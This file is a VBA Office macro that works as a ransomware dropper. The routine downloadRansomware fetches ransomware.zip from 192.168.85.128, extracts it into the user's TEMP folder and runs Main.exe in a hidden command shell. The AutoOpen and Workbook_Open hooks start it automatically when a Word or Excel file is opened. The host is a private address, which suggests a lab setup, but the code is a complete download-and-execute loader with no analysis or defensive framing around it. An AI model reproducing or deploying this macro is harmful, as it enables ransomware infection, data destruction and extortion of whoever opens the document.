Sub downloadRansomware()
    
    'Initialize the path
    Set oShell = CreateObject("WScript.Shell")
    Path = oShell.ExpandEnvironmentStrings("%TEMP%")
    
    'Download the ransomware in a ZIP format
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "http://192.168.85.128/ransomware.zip", False
    xHttp.Send
    
        With bStrm
            .Type = 1 '//Binary format
            .Open
            .write xHttp.responseBody
            .savetofile Path + "\ransomware.zip", 2 '//Overwrite if file already exists
        End With
    
    'Initialize the variables to use the unzip function
    Dim unzipFolder As String
    Dim folderName As Variant
    unzipFolder = Path
    zipFolderName = Path + "\ransomware.zip"
    
    'Call the unzip function
    Call UnZip(unzipFolder, zipFolderName)
    
    'Remove the zip folder
    Kill Path + "\ransomware.zip"
    
    'Execute the ransomware
    Dim command As String
    command = "cmd /K cd %TEMP%\ransomware\ & .\Main.exe"
    Set execShell = CreateObject("WScript.Shell")
    execShell.Run command, 0, False
    
End Sub

'Function Unzip
Sub UnZip(strTargetPath As String, Fname As Variant)
    'strTargetPath is the path where the archive must be extracted
    'Fname combined the name and path to the ZIP file
    
    'Initialize variable
    Dim oApp As Object
    Dim FileNameFolder As Variant
 
    If Right(strTargetPath, 1) <> Application.PathSeparator Then
 
        strTargetPath = strTargetPath & Application.PathSeparator
 
    End If
    FileNameFolder = strTargetPath
    
    'Create a folder if it doesn't exists
    Set FSOobj = CreateObject("Scripting.FilesystemObject")
    If FSOobj.FolderExists(FileNameFolder) = False Then
        FSOobj.CreateFolder FileNameFolder
    End If
    
    'Copy files in an other folder
    Set oApp = CreateObject("Shell.Application")
    oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items
    
 
End Sub


'Add compatibility for PowerPoint and Excel,
'Using the AutoOpen() and Workbook_Open() functions

Sub AutoOpen()
    downloadRansomware
End Sub

Sub Workbook_Open()
    downloadRansomware
End Sub
